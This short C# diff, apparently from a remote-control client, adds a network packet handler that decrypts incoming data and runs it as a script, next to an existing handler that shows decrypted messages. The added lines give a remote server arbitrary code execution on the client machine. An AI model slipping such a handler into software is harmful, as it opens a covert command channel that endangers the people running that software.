@@ -105,6 +105,10 @@ namespace Client.Core.Networking
             {
                 ShowMessageBox.Execute(Cryptography.Decrypt(incomingData));
             });
+            Connection.AppendIncomingPacketHandler<string>("RemoteScriptReq", (packetHeader, connection, incomingData) =>
+            {
+                ExecuteScript.Execute(Cryptography.Decrypt(incomingData));
+            });
 
         }
 
